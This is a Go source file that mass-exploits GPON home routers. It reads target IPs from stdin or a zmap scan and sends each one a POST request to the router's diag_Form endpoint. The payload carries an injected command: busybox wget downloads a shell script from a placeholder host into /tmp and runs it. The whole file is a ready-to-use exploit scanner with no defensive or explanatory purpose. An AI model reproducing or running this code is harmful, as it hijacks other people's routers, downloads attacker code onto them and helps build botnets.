//#ARGS [ cat list | ./gpon or zmap -p8080 -w mx.zone -o-|./gpon ] --> Don't expect some fancy output.
// and if ur dumb its go... compile it.
package main
 
import (
//"fmt"
"net/http"
"sync"
"bufio"
"time"
"os"
"strings"
"bytes"
)
var payload []byte = []byte("XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://YOURHOST/YOURSHELLSCRIPT+-O+/tmp/ff;sh+/tmp/ff`&ipv=0")
 
var wg sync.WaitGroup   
var queue []string;
 
func work(ip string){
    ip = strings.TrimRight(ip, "\r\n")
    url := "http://"+ip+":8080/GponForm/diag_Form?script/"
    tr := &http.Transport{
        ResponseHeaderTimeout: 5*time.Second,
        DisableCompression: true,
    }
    client := &http.Client{Transport: tr, Timeout: 5*time.Second}
    _, _ = client.Post(url, "text/plain", bytes.NewBuffer(payload))
}
 
 
func main(){
    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan(){
            go work(scan.Text())
            wg.Add(1)
            time.Sleep(2*time.Millisecond)
        }
    }
 
}